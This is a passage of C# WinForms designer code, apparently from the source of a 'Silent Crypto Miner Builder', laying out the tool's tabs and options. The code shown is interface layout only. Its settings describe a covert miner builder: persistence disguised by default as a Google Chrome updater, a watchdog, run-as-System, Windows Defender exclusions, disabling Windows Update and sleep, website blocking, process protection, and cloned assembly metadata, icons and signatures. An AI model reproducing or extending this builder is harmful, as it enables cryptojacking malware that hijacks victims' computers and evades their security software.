using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class Builder : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components = null;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Builder));
            this.workerBuild = new System.ComponentModel.BackgroundWorker();
            this.formBuilder = new MephTheme();
            this.tabcontrolBuilder = new MephTabcontrol();
            this.tabMain = new System.Windows.Forms.TabPage();
            this.labelLang = new System.Windows.Forms.Label();
            this.comboLanguage = new MephComboBox();
            this.btnLoadState = new MephButton();
            this.btnSaveState = new MephButton();
            this.listMiners = new MephListBox();
            this.btnMinerRemove = new MephButton();
            this.btnMinerEdit = new MephButton();
            this.btnMinerAdd = new MephButton();
            this.labelMiners = new System.Windows.Forms.Label();
            this.labelWiki = new System.Windows.Forms.LinkLabel();
            this.labelHelp = new System.Windows.Forms.Label();
            this.tabStartup = new System.Windows.Forms.TabPage();
            this.picAdmin4 = new System.Windows.Forms.PictureBox();
            this.labelStartupRunSystem = new System.Windows.Forms.Label();
            this.toggleRunSystem = new MephToggleSwitch();
            this.txtStartupFileName = new MephTextBox();
            this.labelStartupFileName = new System.Windows.Forms.Label();
            this.labelStartupAutoDelete = new System.Windows.Forms.Label();
            this.toggleAutoDelete = new MephToggleSwitch();
            this.labelStartupWatchdog = new System.Windows.Forms.Label();
            this.toggleWatchdog = new MephToggleSwitch();
            this.chkStartup = new MephCheckBox();
            this.txtStartupEntryName = new MephTextBox();
            this.labelStartupSavePath = new System.Windows.Forms.Label();
            this.labelStartupEntryName = new System.Windows.Forms.Label();
            this.txtStartupPath = new MephComboBox();
            this.tabAssembly = new System.Windows.Forms.TabPage();
            this.labelAssemblyVersion = new System.Windows.Forms.Label();
            this.chkAssembly = new MephCheckBox();
            this.btnAssemblyRandom = new MephButton();
            this.txtAssemblyTitle = new MephTextBox();
            this.btnAssemblyClone = new MephButton();
            this.txtAssemblyProduct = new MephTextBox();
            this.txtAssemblyVersion4 = new MephTextBox();
            this.txtAssemblyDescription = new MephTextBox();
            this.txtAssemblyVersion3 = new MephTextBox();
            this.txtAssemblyCopyright = new MephTextBox();
            this.txtAssemblyVersion2 = new MephTextBox();
            this.txtAssemblyCompany = new MephTextBox();
            this.txtAssemblyVersion1 = new MephTextBox();
            this.txtAssemblyTrademark = new MephTextBox();
            this.tabIcon = new System.Windows.Forms.TabPage();
            this.chkIcon = new MephCheckBox();
            this.picIcon = new System.Windows.Forms.PictureBox();
            this.btnIconBrowse = new MephButton();
            this.txtIconPath = new MephTextBox();
            this.tabSignature = new System.Windows.Forms.TabPage();
            this.labelSignatureData = new System.Windows.Forms.Label();
            this.txtSignatureData = new MephTextBox();
            this.btnSignatureClone = new MephButton();
            this.btnSignatureBrowse = new MephButton();
            this.txtSignaturePath = new MephTextBox();
            this.chkSignature = new MephCheckBox();
            this.tabOptions = new System.Windows.Forms.TabPage();
            this.picAdmin5 = new System.Windows.Forms.PictureBox();
            this.labelOptionProcessProtect = new System.Windows.Forms.Label();
            this.toggleProcessProtect = new MephToggleSwitch();
            this.btnAdvancedOptions = new MephButton();
            this.picAdmin2 = new System.Windows.Forms.PictureBox();
            this.labelOptionWindowsUpdate = new System.Windows.Forms.Label();
            this.toggleWindowsUpdate = new MephToggleSwitch();
            this.picAdmin3 = new System.Windows.Forms.PictureBox();
            this.chkBlockWebsites = new MephCheckBox();
            this.txtBlockWebsites = new MephTextBox();
            this.labelDisableSleep = new System.Windows.Forms.Label();
            this.toggleDisableSleep = new MephToggleSwitch();
            this.labelOptionAdministrator = new System.Windows.Forms.Label();
            this.toggleAdministrator = new MephToggleSwitch();
            this.picAdmin1 = new System.Windows.Forms.PictureBox();
            this.labelOptionWD = new System.Windows.Forms.Label();
            this.toggleWDExclusions = new MephToggleSwitch();
            this.tabBuild = new System.Windows.Forms.TabPage();
            this.labelSeconds = new System.Windows.Forms.Label();
            this.labelStartDelay = new System.Windows.Forms.Label();
            this.txtStartDelay = new MephTextBox();
            this.labelGitHub = new System.Windows.Forms.LinkLabel();
            this.txtLog = new MephTextBox();
            this.btnBuild = new MephButton();
            this.formBuilder.SuspendLayout();
            this.tabcontrolBuilder.SuspendLayout();
            this.tabMain.SuspendLayout();
            this.tabStartup.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin4)).BeginInit();
            this.tabAssembly.SuspendLayout();
            this.tabIcon.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).BeginInit();
            this.tabSignature.SuspendLayout();
            this.tabOptions.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin1)).BeginInit();
            this.tabBuild.SuspendLayout();
            this.SuspendLayout();
            // 
            // workerBuild
            // 
            this.workerBuild.DoWork += new System.ComponentModel.DoWorkEventHandler(this.workerBuild_DoWork);
            this.workerBuild.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.workerBuild_RunWorkerCompleted);
            // 
            // formBuilder
            // 
            this.formBuilder.AccentColor = System.Drawing.Color.Transparent;
            this.formBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formBuilder.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formBuilder.Controls.Add(this.tabcontrolBuilder);
            this.formBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formBuilder.ForeColor = System.Drawing.Color.Gray;
            this.formBuilder.Location = new System.Drawing.Point(0, 0);
            this.formBuilder.Margin = new System.Windows.Forms.Padding(2);
            this.formBuilder.MaximumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.MinimumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.Name = "formBuilder";
            this.formBuilder.Size = new System.Drawing.Size(535, 272);
            this.formBuilder.SubHeader = "By Unam Sanctam";
            this.formBuilder.TabIndex = 0;
            this.formBuilder.Text = "Silent Crypto Miner Builder";
            // 
            // tabcontrolBuilder
            // 
            this.tabcontrolBuilder.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.tabcontrolBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.tabcontrolBuilder.Controls.Add(this.tabMain);
            this.tabcontrolBuilder.Controls.Add(this.tabStartup);
            this.tabcontrolBuilder.Controls.Add(this.tabAssembly);
            this.tabcontrolBuilder.Controls.Add(this.tabIcon);
            this.tabcontrolBuilder.Controls.Add(this.tabSignature);
            this.tabcontrolBuilder.Controls.Add(this.tabOptions);
            this.tabcontrolBuilder.Controls.Add(this.tabBuild);
            this.tabcontrolBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.tabcontrolBuilder.ItemSize = new System.Drawing.Size(27, 85);
            this.tabcontrolBuilder.Location = new System.Drawing.Point(13, 65);
            this.tabcontrolBuilder.Margin = new System.Windows.Forms.Padding(0);
            this.tabcontrolBuilder.Multiline = true;
            this.tabcontrolBuilder.Name = "tabcontrolBuilder";
            this.tabcontrolBuilder.Padding = new System.Drawing.Point(0, 0);
            this.tabcontrolBuilder.SelectedIndex = 0;
            this.tabcontrolBuilder.Size = new System.Drawing.Size(511, 197);
            this.tabcontrolBuilder.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrolBuilder.TabIndex = 17;
            // 
            // tabMain
            // 
            this.tabMain.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabMain.Controls.Add(this.labelLang);
            this.tabMain.Controls.Add(this.comboLanguage);
            this.tabMain.Controls.Add(this.btnLoadState);
            this.tabMain.Controls.Add(this.btnSaveState);
            this.tabMain.Controls.Add(this.listMiners);
            this.tabMain.Controls.Add(this.btnMinerRemove);
            this.tabMain.Controls.Add(this.btnMinerEdit);
            this.tabMain.Controls.Add(this.btnMinerAdd);
            this.tabMain.Controls.Add(this.labelMiners);
            this.tabMain.Controls.Add(this.labelWiki);
            this.tabMain.Controls.Add(this.labelHelp);
            this.tabMain.Location = new System.Drawing.Point(89, 4);
            this.tabMain.Margin = new System.Windows.Forms.Padding(0);
            this.tabMain.Name = "tabMain";
            this.tabMain.Size = new System.Drawing.Size(418, 189);
            this.tabMain.TabIndex = 0;
            this.tabMain.Text = "Main";
            // 
            // labelLang
            // 
            this.labelLang.AutoEllipsis = true;
            this.labelLang.BackColor = System.Drawing.Color.Transparent;
            this.labelLang.Location = new System.Drawing.Point(15, 160);
            this.labelLang.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelLang.Name = "labelLang";
            this.labelLang.Size = new System.Drawing.Size(68, 17);
            this.labelLang.TabIndex = 51;
            this.labelLang.Text = "Language:";
            // 
            // comboLanguage
            // 
            this.comboLanguage.BackColor = System.Drawing.Color.Transparent;
            this.comboLanguage.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboLanguage.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboLanguage.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboLanguage.ForeColor = System.Drawing.Color.Silver;
            this.comboLanguage.FormattingEnabled = true;
            this.comboLanguage.ItemHeight = 16;
            this.comboLanguage.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboLanguage.Items.AddRange(new object[] {
            "English",
            "Swedish",
            "Polish",
            "Spanish",
            "Russian",
            "Portuguese (Brazil)"});
            this.comboLanguage.Location = new System.Drawing.Point(83, 158);
            this.comboLanguage.Margin = new System.Windows.Forms.Padding(2);
            this.comboLanguage.Name = "comboLanguage";
            this.comboLanguage.Size = new System.Drawing.Size(140, 22);
            this.comboLanguage.StartIndex = 0;
            this.comboLanguage.TabIndex = 50;
            this.comboLanguage.SelectedIndexChanged += new System.EventHandler(this.comboLanguage_SelectedIndexChanged);
            // 
            // btnLoadState
            // 
            this.btnLoadState.BackColor = System.Drawing.Color.Transparent;
            this.btnLoadState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnLoadState.Location = new System.Drawing.Point(354, 158);
            this.btnLoadState.Name = "btnLoadState";
            this.btnLoadState.Size = new System.Drawing.Size(53, 22);
            this.btnLoadState.TabIndex = 49;
            this.btnLoadState.Text = "Load";
            this.btnLoadState.Click += new System.EventHandler(this.btnLoadState_Click);
            // 
            // btnSaveState
            // 
            this.btnSaveState.BackColor = System.Drawing.Color.Transparent;
            this.btnSaveState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSaveState.Location = new System.Drawing.Point(295, 158);
            this.btnSaveState.Name = "btnSaveState";
            this.btnSaveState.Size = new System.Drawing.Size(53, 22);
            this.btnSaveState.TabIndex = 48;
            this.btnSaveState.Text = "Save";
            this.btnSaveState.Click += new System.EventHandler(this.btnSaveState_Click);
            // 
            // listMiners
            // 
            this.listMiners.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.listMiners.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listMiners.ForeColor = System.Drawing.Color.Silver;
            this.listMiners.ItemHeight = 17;
            this.listMiners.Location = new System.Drawing.Point(15, 31);
            this.listMiners.Name = "listMiners";
            this.listMiners.Size = new System.Drawing.Size(392, 64);
            this.listMiners.TabIndex = 47;
            // 
            // btnMinerRemove
            // 
            this.btnMinerRemove.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerRemove.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerRemove.Location = new System.Drawing.Point(173, 101);
            this.btnMinerRemove.Name = "btnMinerRemove";
            this.btnMinerRemove.Size = new System.Drawing.Size(73, 23);
            this.btnMinerRemove.TabIndex = 46;
            this.btnMinerRemove.Text = "Remove";
            this.btnMinerRemove.Click += new System.EventHandler(this.btnMinerRemove_Click);
            // 
            // btnMinerEdit
            // 
            this.btnMinerEdit.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerEdit.Location = new System.Drawing.Point(94, 101);
            this.btnMinerEdit.Name = "btnMinerEdit";
            this.btnMinerEdit.Size = new System.Drawing.Size(73, 23);
            this.btnMinerEdit.TabIndex = 45;
            this.btnMinerEdit.Text = "Edit";
            this.btnMinerEdit.Click += new System.EventHandler(this.btnMinerEdit_Click);
            // 
            // btnMinerAdd
            // 
            this.btnMinerAdd.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerAdd.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerAdd.Location = new System.Drawing.Point(15, 101);
            this.btnMinerAdd.Name = "btnMinerAdd";
            this.btnMinerAdd.Size = new System.Drawing.Size(73, 23);
            this.btnMinerAdd.TabIndex = 44;
            this.btnMinerAdd.Text = "Add";
            this.btnMinerAdd.Click += new System.EventHandler(this.btnMinerAdd_Click);
            // 
            // labelMiners
            // 
            this.labelMiners.AutoSize = true;
            this.labelMiners.BackColor = System.Drawing.Color.Transparent;
            this.labelMiners.Location = new System.Drawing.Point(12, 11);
            this.labelMiners.Name = "labelMiners";
            this.labelMiners.Size = new System.Drawing.Size(51, 17);
            this.labelMiners.TabIndex = 42;
            this.labelMiners.Text = "Miners:";
            // 
            // labelWiki
            // 
            this.labelWiki.AutoSize = true;
            this.labelWiki.BackColor = System.Drawing.Color.Transparent;
            this.labelWiki.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelWiki.Location = new System.Drawing.Point(378, 10);
            this.labelWiki.Name = "labelWiki";
            this.labelWiki.Size = new System.Drawing.Size(29, 17);
            this.labelWiki.TabIndex = 40;
            this.labelWiki.TabStop = true;
            this.labelWiki.Text = "wiki";
            this.labelWiki.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelWiki_LinkClicked);
            // 
            // labelHelp
            // 
            this.labelHelp.BackColor = System.Drawing.Color.Transparent;
            this.labelHelp.Location = new System.Drawing.Point(176, 11);
            this.labelHelp.Name = "labelHelp";
            this.labelHelp.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.labelHelp.Size = new System.Drawing.Size(210, 17);
            this.labelHelp.TabIndex = 41;
            this.labelHelp.Text = "For help please check the ";
            this.labelHelp.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            // 
            // tabStartup
            // 
            this.tabStartup.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabStartup.Controls.Add(this.picAdmin4);
            this.tabStartup.Controls.Add(this.labelStartupRunSystem);
            this.tabStartup.Controls.Add(this.toggleRunSystem);
            this.tabStartup.Controls.Add(this.txtStartupFileName);
            this.tabStartup.Controls.Add(this.labelStartupFileName);
            this.tabStartup.Controls.Add(this.labelStartupAutoDelete);
            this.tabStartup.Controls.Add(this.toggleAutoDelete);
            this.tabStartup.Controls.Add(this.labelStartupWatchdog);
            this.tabStartup.Controls.Add(this.toggleWatchdog);
            this.tabStartup.Controls.Add(this.chkStartup);
            this.tabStartup.Controls.Add(this.txtStartupEntryName);
            this.tabStartup.Controls.Add(this.labelStartupSavePath);
            this.tabStartup.Controls.Add(this.labelStartupEntryName);
            this.tabStartup.Controls.Add(this.txtStartupPath);
            this.tabStartup.Location = new System.Drawing.Point(89, 4);
            this.tabStartup.Margin = new System.Windows.Forms.Padding(0);
            this.tabStartup.Name = "tabStartup";
            this.tabStartup.Size = new System.Drawing.Size(418, 189);
            this.tabStartup.TabIndex = 1;
            this.tabStartup.Text = "Startup";
            // 
            // picAdmin4
            // 
            this.picAdmin4.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin4.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.picAdmin4.Location = new System.Drawing.Point(388, 161);
            this.picAdmin4.Name = "picAdmin4";
            this.picAdmin4.Size = new System.Drawing.Size(20, 20);
            this.picAdmin4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin4.TabIndex = 100;
            this.picAdmin4.TabStop = false;
            // 
            // labelStartupRunSystem
            // 
            this.labelStartupRunSystem.AutoEllipsis = true;
            this.labelStartupRunSystem.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupRunSystem.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupRunSystem.ForeColor = System.Drawing.Color.Gray;
            this.labelStartupRunSystem.Location = new System.Drawing.Point(218, 161);
            this.labelStartupRunSystem.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupRunSystem.Name = "labelStartupRunSystem";
            this.labelStartupRunSystem.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.labelStartupRunSystem.Size = new System.Drawing.Size(111, 17);
            this.labelStartupRunSystem.TabIndex = 99;
            this.labelStartupRunSystem.Text = "Run as System:";
            this.labelStartupRunSystem.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            // 
            // toggleRunSystem
            // 
            this.toggleRunSystem.BackColor = System.Drawing.Color.Transparent;
            this.toggleRunSystem.Checked = true;
            this.toggleRunSystem.Enabled = false;
            this.toggleRunSystem.ForeColor = System.Drawing.Color.Black;
            this.toggleRunSystem.Location = new System.Drawing.Point(333, 159);
            this.toggleRunSystem.Margin = new System.Windows.Forms.Padding(2);
            this.toggleRunSystem.Name = "toggleRunSystem";
            this.toggleRunSystem.Size = new System.Drawing.Size(50, 24);
            this.toggleRunSystem.TabIndex = 98;
            this.toggleRunSystem.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleRunSystem_CheckedChanged);
            // 
            // txtStartupFileName
            // 
            this.txtStartupFileName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartupFileName.Enabled = false;
            this.txtStartupFileName.ForeColor = System.Drawing.Color.Silver;
            this.txtStartupFileName.Location = new System.Drawing.Point(95, 102);
            this.txtStartupFileName.Margin = new System.Windows.Forms.Padding(2);
            this.txtStartupFileName.MaxLength = 32767;
            this.txtStartupFileName.MultiLine = false;
            this.txtStartupFileName.Name = "txtStartupFileName";
            this.txtStartupFileName.ReadOnly = false;
            this.txtStartupFileName.Size = new System.Drawing.Size(139, 24);
            this.txtStartupFileName.TabIndex = 48;
            this.txtStartupFileName.Text = "Google\\Chrome\\updater.exe";
            this.txtStartupFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartupFileName.UseSystemPasswordChar = false;
            this.txtStartupFileName.WordWrap = false;
            // 
            // labelStartupFileName
            // 
            this.labelStartupFileName.AutoEllipsis = true;
            this.labelStartupFileName.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupFileName.Location = new System.Drawing.Point(11, 104);
            this.labelStartupFileName.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupFileName.Name = "labelStartupFileName";
            this.labelStartupFileName.Size = new System.Drawing.Size(80, 17);
            this.labelStartupFileName.TabIndex = 49;
            this.labelStartupFileName.Text = "File Name:";
            // 
            // labelStartupAutoDelete
            // 
            this.labelStartupAutoDelete.AutoEllipsis = true;
            this.labelStartupAutoDelete.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupAutoDelete.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupAutoDelete.Location = new System.Drawing.Point(12, 161);
            this.labelStartupAutoDelete.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupAutoDelete.Name = "labelStartupAutoDelete";
            this.labelStartupAutoDelete.Size = new System.Drawing.Size(80, 17);
            this.labelStartupAutoDelete.TabIndex = 47;
            this.labelStartupAutoDelete.Text = "Auto-delete:";
            // 
            // toggleAutoDelete
            // 
            this.toggleAutoDelete.BackColor = System.Drawing.Color.Transparent;
            this.toggleAutoDelete.Checked = false;
            this.toggleAutoDelete.Enabled = false;
            this.toggleAutoDelete.ForeColor = System.Drawing.Color.Black;
            this.toggleAutoDelete.Location = new System.Drawing.Point(95, 159);
            this.toggleAutoDelete.Margin = new System.Windows.Forms.Padding(2);
            this.toggleAutoDelete.Name = "toggleAutoDelete";
            this.toggleAutoDelete.Size = new System.Drawing.Size(50, 24);
            this.toggleAutoDelete.TabIndex = 46;
            // 
            // labelStartupWatchdog
            // 
            this.labelStartupWatchdog.AutoEllipsis = true;
            this.labelStartupWatchdog.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupWatchdog.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupWatchdog.Location = new System.Drawing.Point(12, 132);
            this.labelStartupWatchdog.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupWatchdog.Name = "labelStartupWatchdog";
            this.labelStartupWatchdog.Size = new System.Drawing.Size(80, 17);
            this.labelStartupWatchdog.TabIndex = 45;
            this.labelStartupWatchdog.Text = "Watchdog:";
            // 
            // toggleWatchdog
            // 
            this.toggleWatchdog.BackColor = System.Drawing.Color.Transparent;
            this.toggleWatchdog.Checked = true;
            this.toggleWatchdog.Enabled = false;
            this.toggleWatchdog.ForeColor = System.Drawing.Color.Black;
            this.toggleWatchdog.Location = new System.Drawing.Point(95, 130);
            this.toggleWatchdog.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWatchdog.Name = "toggleWatchdog";
            this.toggleWatchdog.Size = new System.Drawing.Size(50, 24);
            this.toggleWatchdog.TabIndex = 44;
            // 
            // chkStartup
            // 
            this.chkStartup.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkStartup.BackColor = System.Drawing.Color.Transparent;
            this.chkStartup.Checked = false;
            this.chkStartup.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkStartup.ForeColor = System.Drawing.Color.Black;
            this.chkStartup.Location = new System.Drawing.Point(14, 12);
            this.chkStartup.Margin = new System.Windows.Forms.Padding(2);
            this.chkStartup.Name = "chkStartup";
            this.chkStartup.Size = new System.Drawing.Size(111, 24);
            this.chkStartup.TabIndex = 21;
            this.chkStartup.Text = "Disabled";
            this.chkStartup.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkStartup_CheckedChanged);
            // 
            // txtStartupEntryName
            // 
            this.txtStartupEntryName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartupEntryName.Enabled = false;
            this.txtStartupEntryName.ForeColor = System.Drawing.Color.Silver;
            this.txtStartupEntryName.Location = new System.Drawing.Point(95, 73);
            this.txtStartupEntryName.Margin = new System.Windows.Forms.Padding(2);
            this.txtStartupEntryName.MaxLength = 32767;
            this.txtStartupEntryName.MultiLine = false;
            this.txtStartupEntryName.Name = "txtStartupEntryName";
            this.txtStartupEntryName.ReadOnly = false;
            this.txtStartupEntryName.Size = new System.Drawing.Size(139, 24);
            this.txtStartupEntryName.TabIndex = 8;
            this.txtStartupEntryName.Text = "GoogleUpdateTaskMachineQC";
            this.txtStartupEntryName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartupEntryName.UseSystemPasswordChar = false;
            this.txtStartupEntryName.WordWrap = false;
            // 
            // labelStartupSavePath
            // 
            this.labelStartupSavePath.AutoEllipsis = true;
            this.labelStartupSavePath.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupSavePath.Location = new System.Drawing.Point(11, 46);
            this.labelStartupSavePath.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupSavePath.Name = "labelStartupSavePath";
            this.labelStartupSavePath.Size = new System.Drawing.Size(80, 17);
            this.labelStartupSavePath.TabIndex = 19;
            this.labelStartupSavePath.Text = "Save Path:";
            // 
            // labelStartupEntryName
            // 
            this.labelStartupEntryName.AutoEllipsis = true;
            this.labelStartupEntryName.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupEntryName.Location = new System.Drawing.Point(11, 75);
            this.labelStartupEntryName.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupEntryName.Name = "labelStartupEntryName";
            this.labelStartupEntryName.Size = new System.Drawing.Size(80, 17);
            this.labelStartupEntryName.TabIndex = 9;
            this.labelStartupEntryName.Text = "Entry Name:";
            // 
            // txtStartupPath
            // 
            this.txtStartupPath.BackColor = System.Drawing.Color.Transparent;
            this.txtStartupPath.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.txtStartupPath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.txtStartupPath.Enabled = false;
            this.txtStartupPath.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.txtStartupPath.ForeColor = System.Drawing.Color.Silver;
            this.txtStartupPath.FormattingEnabled = true;
            this.txtStartupPath.ItemHeight = 16;
            this.txtStartupPath.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.txtStartupPath.Items.AddRange(new object[] {
            "AppData",
            "UserProfile"});
            this.txtStartupPath.Location = new System.Drawing.Point(95, 45);
            this.txtStartupPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtStartupPath.Name = "txtStartupPath";
            this.txtStartupPath.Size = new System.Drawing.Size(139, 22);
            this.txtStartupPath.StartIndex = 0;
            this.txtStartupPath.TabIndex = 18;
            // 
            // tabAssembly
            // 
            this.tabAssembly.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabAssembly.Controls.Add(this.labelAssemblyVersion);
            this.tabAssembly.Controls.Add(this.chkAssembly);
            this.tabAssembly.Controls.Add(this.btnAssemblyRandom);
            this.tabAssembly.Controls.Add(this.txtAssemblyTitle);
            this.tabAssembly.Controls.Add(this.btnAssemblyClone);
            this.tabAssembly.Controls.Add(this.txtAssemblyProduct);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion4);
            this.tabAssembly.Controls.Add(this.txtAssemblyDescription);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion3);
            this.tabAssembly.Controls.Add(this.txtAssemblyCopyright);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion2);
            this.tabAssembly.Controls.Add(this.txtAssemblyCompany);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion1);
            this.tabAssembly.Controls.Add(this.txtAssemblyTrademark);
            this.tabAssembly.Location = new System.Drawing.Point(89, 4);
            this.tabAssembly.Margin = new System.Windows.Forms.Padding(0);
            this.tabAssembly.Name = "tabAssembly";
            this.tabAssembly.Size = new System.Drawing.Size(418, 189);
            this.tabAssembly.TabIndex = 2;
            this.tabAssembly.Text = "Assembly";
            // 
            // labelAssemblyVersion
            // 
            this.labelAssemblyVersion.AutoEllipsis = true;
            this.labelAssemblyVersion.Location = new System.Drawing.Point(11, 160);
            this.labelAssemblyVersion.Name = "labelAssemblyVersion";
            this.labelAssemblyVersion.Size = new System.Drawing.Size(71, 17);
            this.labelAssemblyVersion.TabIndex = 22;
            this.labelAssemblyVersion.Text = "Version:";
            // 
            // chkAssembly
            // 
            this.chkAssembly.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAssembly.BackColor = System.Drawing.Color.Transparent;
            this.chkAssembly.Checked = false;
            this.chkAssembly.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAssembly.ForeColor = System.Drawing.Color.Black;
            this.chkAssembly.Location = new System.Drawing.Point(14, 12);
            this.chkAssembly.Margin = new System.Windows.Forms.Padding(2);
            this.chkAssembly.Name = "chkAssembly";
            this.chkAssembly.Size = new System.Drawing.Size(111, 24);
            this.chkAssembly.TabIndex = 21;
            this.chkAssembly.Text = "Disabled";
            this.chkAssembly.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAssembly_CheckedChanged);
            // 
            // btnAssemblyRandom
            // 
            this.btnAssemblyRandom.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyRandom.Enabled = false;
            this.btnAssemblyRandom.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyRandom.Location = new System.Drawing.Point(323, 156);
            this.btnAssemblyRandom.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyRandom.Name = "btnAssemblyRandom";
            this.btnAssemblyRandom.Size = new System.Drawing.Size(82, 25);
